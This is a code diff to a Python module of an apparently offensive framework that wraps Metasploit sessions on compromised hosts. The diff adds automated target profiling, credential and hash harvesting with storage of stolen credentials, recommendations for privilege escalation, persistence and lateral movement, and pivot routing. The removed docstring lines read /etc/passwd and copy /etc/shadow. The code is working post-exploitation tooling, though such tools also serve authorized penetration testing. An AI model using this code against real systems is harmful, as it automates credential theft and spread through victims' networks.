@@ -1,25 +1,45 @@
 """Kill module - a confirmed hit (active session on compromised target).
 
 The Kill class wraps msf.Session with themed methods for post-exploitation
-operations.
+operations, smart profiling, and context-aware harvesting.
 
 Example:
     >>> kill = contract.execute()
     >>> if kill:
     ...     print(f"Target eliminated: {kill}")
     ...     print(kill.interrogate("whoami"))
-    ...     print(kill.interrogate("cat /etc/passwd"))
-    ...     kill.extract("/etc/shadow", "/tmp/shadow.txt")
+    ...
+    ...     # Smart profiling
+    ...     profile = kill.profile()
+    ...     print(f"Running as: {profile.user} (privileged: {profile.is_privileged})")
+    ...
+    ...     # Context-aware recommendations
+    ...     for rec in kill.recommend_actions():
+    ...         print(f"[{rec.priority}] {rec.title}")
+    ...
+    ...     # Auto-harvest based on profile
+    ...     result = kill.harvest(auto=True)
+    ...     print(f"Found {len(result.loot)} items, stored {result.creds_stored} creds")
+    ...
     ...     kill.silence()  # Clean up
 """
 
 from __future__ import annotations
 
 import os
-from typing import TYPE_CHECKING, Optional
+from typing import TYPE_CHECKING, Any, Dict, List, Optional
 
 from assassinate.console import print_kill
 from assassinate.log_config import get_logger
+from assassinate.profile import (
+    HarvestResult,
+    LootItem,
+    Recommendation,
+    TargetProfile,
+    HARVEST_MODULES,
+    PRIVESC_MODULES,
+    PERSISTENCE_MODULES,
+)
 
 if TYPE_CHECKING:
     import msf
@@ -54,7 +74,7 @@ class Kill:
         ...     kill.silence()
     """
 
-    __slots__ = ("_session", "target", "_via_weapon", "_via_payload")
+    __slots__ = ("_session", "target", "_via_weapon", "_via_payload", "_profile")
 
     def __init__(
         self,
@@ -75,6 +95,7 @@ class Kill:
         self.target = target
         self._via_weapon = via_weapon
         self._via_payload = via_payload
+        self._profile: Optional[TargetProfile] = None
         logger.success(
             f"Kill confirmed: session {session.sid} @ {session.host}:{session.port} via {via_weapon or 'unknown'}"
         )
@@ -312,7 +333,487 @@ class Kill:
             logger.warning(f"Failed to silence kill {self.id}: {e}")
 
     # =========================================================================
-    # Advanced / Future Features
+    # Intelligence Layer - Profiling, Harvesting, Recommendations
+    # =========================================================================
+
+    def profile(self, cache: bool = True) -> TargetProfile:
+        """Profile the compromised target to gather system information.
+
+        Collects OS, user, privileges, network interfaces, and routes
+        using meterpreter session methods. The profile is cached by default.
+
+        Args:
+            cache: Use cached profile if available (default True)
+
+        Returns:
+            TargetProfile with system information
+
+        Raises:
+            RuntimeError: If called on a non-meterpreter session
+
+        Example:
+            >>> profile = kill.profile()
+            >>> print(f"OS: {profile.os_name}")
+            >>> print(f"User: {profile.user}")
+            >>> print(f"Privileged: {profile.is_privileged}")
+            >>> for net in profile.internal_networks:
+            ...     print(f"Internal network: {net}")
+        """
+        if cache and self._profile is not None:
+            logger.debug("Returning cached profile")
+            return self._profile
+
+        if not self.is_meterpreter:
+            raise RuntimeError(
+                "profile() requires a meterpreter session. "
+                "Use shell_to_meterpreter() to upgrade, or gather info manually."
+            )
+
+        logger.info(f"Profiling target via session {self.id}")
+
+        # Gather system info
+        try:
+            sysinfo = self._session._rust.sys_sysinfo()
+        except Exception as e:
+            logger.warning(f"Failed to get sysinfo: {e}")
+            sysinfo = {}
+
+        try:
+            user = self._session._rust.sys_getuid()
+        except Exception as e:
+            logger.warning(f"Failed to get user: {e}")
+            user = ""
+
+        # Parse OS info
+        os_str = sysinfo.get("OS", "")
+        os_name = "Unknown"
+        if "windows" in os_str.lower():
+            os_name = "Windows"
+        elif "linux" in os_str.lower():
+            os_name = "Linux"
+        elif "darwin" in os_str.lower() or "macos" in os_str.lower():
+            os_name = "macOS"
+
+        # Get architecture
+        try:
+            arch = self._session._rust.meterpreter_native_arch()
+        except Exception:
+            arch = sysinfo.get("Architecture", "")
+
+        # Get privileges (Windows-specific)
+        is_system = False
+        privileges: List[str] = []
+        if os_name == "Windows":
+            try:
+                is_system = self._session._rust.sys_is_system()
+            except Exception:
+                pass
+            try:
+                privileges = self._session._rust.sys_getprivs()
+            except Exception:
+                pass
+
+        # Parse UID for Unix
+        uid: Optional[int] = None
+        if os_name != "Windows" and user:
+            # Try to extract UID from user string like "uid=0(root)"
+            import re
+            match = re.search(r"uid=(\d+)", user)
+            if match:
+                uid = int(match.group(1))
+            elif "root" in user.lower():
+                uid = 0
+
+        # Get network interfaces
+        interfaces: List[Dict[str, Any]] = []
+        try:
+            interfaces = self._session._rust.net_get_interfaces()
+        except Exception as e:
+            logger.warning(f"Failed to get interfaces: {e}")
+
+        # Get routes
+        routes: List[Dict[str, Any]] = []
+        try:
+            routes = self._session._rust.net_get_routes()
+        except Exception as e:
+            logger.warning(f"Failed to get routes: {e}")
+
+        # Discover internal networks from interfaces
+        internal_networks: List[str] = []
+        for iface in interfaces:
+            ip = iface.get("ip", "")
+            if ip and not ip.startswith("127.") and not ip.startswith("::"):
+                # Simple /24 subnet extraction
+                parts = ip.rsplit(".", 1)
+                if len(parts) == 2:
+                    subnet = f"{parts[0]}.0/24"
+                    if subnet not in internal_networks:
+                        internal_networks.append(subnet)
+
+        # Get domain info (Windows)
+        domain = sysinfo.get("Domain", "")
+
+        # Convert lists to tuples for frozen dataclass
+        self._profile = TargetProfile(
+            os=os_str,
+            os_name=os_name,
+            computer=sysinfo.get("Computer", ""),
+            architecture=arch,
+            user=user,
+            uid=uid,
+            privileges=tuple(privileges),
+            is_system=is_system,
+            interfaces=tuple(
+                tuple(sorted(iface.items())) if isinstance(iface, dict) else iface
+                for iface in interfaces
+            ),
+            routes=tuple(
+                tuple(sorted(route.items())) if isinstance(route, dict) else route
+                for route in routes
+            ),
+            internal_networks=tuple(internal_networks),
+            domain=domain,
+        )
+
+        logger.info(f"Profile complete: {self._profile}")
+        return self._profile
+
+    def harvest(
+        self,
+        modules: Optional[List[str]] = None,
+        auto: bool = False,
+    ) -> HarvestResult:
+        """Run post-exploitation modules and collect loot.
+
+        Can run specific modules or auto-select based on the target profile.
+        Credentials are automatically stored in the MSF database if available.
+
+        Args:
+            modules: Specific post modules to run (optional)
+            auto: Auto-select modules based on target profile
+
+        Returns:
+            HarvestResult with profile, loot, and statistics
+
+        Example:
+            >>> # Auto-select modules based on profile
+            >>> result = kill.harvest(auto=True)
+            >>> for item in result.loot:
+            ...     print(f"{item.type}: {item.data}")
+
+            >>> # Run specific modules
+            >>> result = kill.harvest(modules=[
+            ...     "post/multi/gather/env",
+            ...     "post/linux/gather/hashdump"
+            ... ])
+        """
+        import msf
+
+        logger.info(f"Harvesting from session {self.id}")
+
+        # Get profile (needed for auto-selection and result)
+        try:
+            target_profile = self.profile()
+        except RuntimeError:
+            # Non-meterpreter session - create minimal profile
+            target_profile = TargetProfile(
+                os="Unknown",
+                os_name="Unknown",
+                user="",
+            )
+
+        # Auto-select modules if requested
+        if auto and not modules:
+            modules = self._select_harvest_modules(target_profile)
+            logger.debug(f"Auto-selected {len(modules)} harvest modules")
+
+        if not modules:
+            logger.warning("No modules specified and auto=False")
+            return HarvestResult(profile=target_profile)
+
+        # Run modules and collect loot
+        loot: List[LootItem] = []
+        modules_run: List[str] = []
+        errors: List[str] = []
+
+        for mod_name in modules:
+            logger.debug(f"Running harvest module: {mod_name}")
+            try:
+                result = self._session.run_post_module(mod_name, {})
+                modules_run.append(mod_name)
+
+                # Parse loot from module output (module-specific)
+                parsed_loot = self._parse_module_loot(mod_name, result)
+                loot.extend(parsed_loot)
+
+            except Exception as e:
+                error_msg = f"{mod_name}: {e}"
+                errors.append(error_msg)
+                logger.warning(f"Harvest module failed: {error_msg}")
+
+        # Store credentials in database
+        creds_stored = 0
+        if msf.db_active():
+            for item in loot:
+                if item.type == "credential":
+                    try:
+                        msf.db_report_cred({
+                            "host": item.host,
+                            "user": item.data.get("user", ""),
+                            "pass": item.data.get("password", ""),
+                            "type": item.data.get("type", "password"),
+                        })
+                        creds_stored += 1
+                    except Exception as e:
+                        logger.warning(f"Failed to store credential: {e}")
+
+        result = HarvestResult(
+            profile=target_profile,
+            loot=loot,
+            creds_stored=creds_stored,
+            modules_run=modules_run,
+            errors=errors,
+        )
+
+        logger.info(
+            f"Harvest complete: {len(loot)} items, {creds_stored} creds stored, "
+            f"{len(errors)} errors"
+        )
+        return result
+
+    def _select_harvest_modules(self, target_profile: TargetProfile) -> List[str]:
+        """Auto-select harvest modules based on target profile.
+
+        Args:
+            target_profile: Target system profile
+
+        Returns:
+            List of appropriate post module names
+        """
+        modules: List[str] = []
+
+        # Determine platform key
+        if target_profile.is_windows:
+            platform = "windows"
+        elif target_profile.is_macos:
+            platform = "macos"
+        else:
+            platform = "linux"
+
+        # Determine privilege level
+        if target_profile.is_privileged:
+            if target_profile.is_windows:
+                priv_level = "system" if target_profile.is_system else "admin"
+            else:
+                priv_level = "root"
+        else:
+            priv_level = "user"
+
+        # Get modules for this platform and privilege level
+        platform_modules = HARVEST_MODULES.get(platform, {})
+        modules = platform_modules.get(priv_level, []).copy()
+
+        # Add user-level modules if we're privileged (we can do everything)
+        if priv_level != "user":
+            user_modules = platform_modules.get("user", [])
+            for mod in user_modules:
+                if mod not in modules:
+                    modules.append(mod)
+
+        logger.debug(
+            f"Selected {len(modules)} modules for {platform}/{priv_level}"
+        )
+        return modules
+
+    def _parse_module_loot(
+        self, module_name: str, result: Any
+    ) -> List[LootItem]:
+        """Parse loot from a post module's output.
+
+        This is a simplified parser - in practice, different modules
+        return data in different formats.
+
+        Args:
+            module_name: Name of the module that ran
+            result: Module execution result
+
+        Returns:
+            List of parsed LootItem objects
+        """
+        loot: List[LootItem] = []
+
+        # Module ran successfully but we don't have structured output yet
+        # In a full implementation, this would parse MSF's loot/cred tables
+        # For now, we note that the module ran
+        logger.debug(f"Module {module_name} completed, result: {result}")
+
+        # Heuristic parsing based on module type
+        if "hashdump" in module_name.lower():
+            loot.append(LootItem(
+                type="hash",
+                source_module=module_name,
+                data={"note": "Hashes captured - check MSF loot"},
+                host=self.host,
+            ))
+        elif "cred" in module_name.lower():
+            loot.append(LootItem(
+                type="credential",
+                source_module=module_name,
+                data={"note": "Credentials gathered - check MSF creds"},
+                host=self.host,
+            ))
+        elif "env" in module_name.lower():
+            loot.append(LootItem(
+                type="info",
+                source_module=module_name,
+                data={"note": "Environment info gathered"},
+                host=self.host,
+            ))
+
+        return loot
+
+    def recommend_actions(self) -> List[Recommendation]:
+        """Generate context-aware recommendations for next steps.
+
+        Based on the target profile, suggests appropriate actions like
+        privilege escalation, persistence, lateral movement, or harvesting.
+
+        Returns:
+            List of Recommendation objects sorted by priority
+
+        Example:
+            >>> for rec in kill.recommend_actions():
+            ...     print(f"[{rec.priority}] {rec.title}: {rec.description}")
+            ...     if rec.module:
+            ...         print(f"    Suggested module: {rec.module}")
+        """
+        logger.debug("Generating action recommendations")
+        recommendations: List[Recommendation] = []
+
+        try:
+            target_profile = self.profile()
+        except RuntimeError:
+            # Non-meterpreter session
+            recommendations.append(Recommendation(
+                category="upgrade",
+                priority=1,
+                title="Upgrade to Meterpreter",
+                description="Shell session has limited capabilities. Upgrade for full post-exploitation.",
+                module=None,
+            ))
+            return recommendations
+
+        # Privilege escalation recommendations
+        if not target_profile.is_privileged:
+            recommendations.append(Recommendation(
+                category="privesc",
+                priority=1,
+                title="Privilege Escalation Required",
+                description=f"Running as {target_profile.user}, not privileged. Escalation needed for full access.",
+                module="post/multi/recon/local_exploit_suggester",
+            ))
+
+            # Platform-specific privesc modules
+            if target_profile.is_windows:
+                recommendations.append(Recommendation(
+                    category="privesc",
+                    priority=2,
+                    title="Enumerate Missing Patches",
+                    description="Check for missing Windows patches that may allow privilege escalation.",
+                    module="post/windows/gather/enum_patches",
+                ))
+            else:
+                recommendations.append(Recommendation(
+                    category="privesc",
+                    priority=2,
+                    title="Check Security Protections",
+                    description="Enumerate security protections that may affect exploitation.",
+                    module="post/linux/gather/enum_protections",
+                ))
+
+        # Harvesting recommendations
+        if target_profile.is_privileged:
+            recommendations.append(Recommendation(
+                category="harvest",
+                priority=2,
+                title="Harvest Credentials",
+                description="Privileged access allows credential dumping.",
+                module="post/windows/gather/hashdump" if target_profile.is_windows else "post/linux/gather/hashdump",
+            ))
+
+        # Pivot recommendations based on discovered networks
+        for net in target_profile.internal_networks:
+            # Skip if it's likely the same network we're on
+            if self.host.rsplit(".", 1)[0] + ".0/24" == net:
+                continue
+
+            recommendations.append(Recommendation(
+                category="pivot",
+                priority=3,
+                title=f"Pivot to {net}",
+                description=f"Internal network {net} discovered via {target_profile.computer}. Consider lateral movement.",
+                module=None,
+            ))
+
+        # Persistence recommendations (lower priority)
+        if target_profile.is_privileged:
+            recommendations.append(Recommendation(
+                category="persist",
+                priority=4,
+                title="Establish Persistence",
+                description="Consider installing persistence mechanism for continued access.",
+                module=PERSISTENCE_MODULES.get(
+                    "windows" if target_profile.is_windows else "linux", [""]
+                )[0] or None,
+            ))
+
+        # Sort by priority
+        recommendations.sort()
+
+        logger.debug(f"Generated {len(recommendations)} recommendations")
+        return recommendations
+
+    def pivot(self, subnet: str, netmask: str = "255.255.255.0") -> bool:
+        """Add a pivot route through this session.
+
+        Enables MSF routing so traffic destined for the subnet flows
+        through this session's meterpreter.
+
+        Args:
+            subnet: Destination subnet (e.g., "10.0.0.0")
+            netmask: Subnet mask (default "255.255.255.0")
+
+        Returns:
+            True if route was added successfully
+
+        Example:
+            >>> # Discovered internal network via profile
+            >>> profile = kill.profile()
+            >>> for net in profile.internal_networks:
+            ...     subnet = net.split("/")[0]  # "10.0.0.0/24" -> "10.0.0.0"
+            ...     kill.pivot(subnet)
+        """
+        import msf
+
+        if not self.is_meterpreter:
+            logger.warning("Pivoting requires a meterpreter session")
+            return False
+
+        logger.info(f"Adding pivot route: {subnet}/{netmask} via session {self.id}")
+
+        try:
+            result = msf.route_add(subnet, netmask, self.id)
+            if result:
+                logger.success(f"Pivot route added: {subnet}/{netmask}")
+            else:
+                logger.warning(f"Failed to add pivot route")
+            return result
+        except Exception as e:
+            logger.error(f"Error adding pivot route: {e}")
+            return False
+
+    # =========================================================================
+    # Advanced Features (Still Placeholders)
     # =========================================================================
 
     def escalate(self) -> Optional["Kill"]:
@@ -322,11 +823,12 @@ class Kill:
             New Kill with elevated privileges, or None
 
         Note:
-            This is a placeholder for future implementation.
+            Use recommend_actions() to find escalation paths,
+            then execute manually.
         """
         raise NotImplementedError(
-            "Privilege escalation automation is not yet implemented. "
-            "Use post-exploitation modules manually."
+            "Automatic privilege escalation is not yet implemented. "
+            "Use recommend_actions() to find escalation paths, then run modules manually."
         )
 
     def persist(self) -> bool:
@@ -336,28 +838,11 @@ class Kill:
             True if persistence installed
 
         Note:
-            This is a placeholder for future implementation.
+            Use recommend_actions() to find persistence options.
         """
         raise NotImplementedError(
-            "Persistence automation is not yet implemented. "
-            "Use post-exploitation modules manually."
-        )
-
-    def pivot(self, target: str) -> Optional["Kill"]:
-        """Pivot to another target through this session (future feature).
-
-        Args:
-            target: IP or hostname of next target
-
-        Returns:
-            Kill for the new target, or None
-
-        Note:
-            This is a placeholder for future implementation.
-        """
-        raise NotImplementedError(
-            "Pivoting automation is not yet implemented. "
-            "Use routing and auxiliary modules manually."
+            "Automatic persistence is not yet implemented. "
+            "Use recommend_actions() to find persistence modules, then run manually."
         )
 
     # =========================================================================
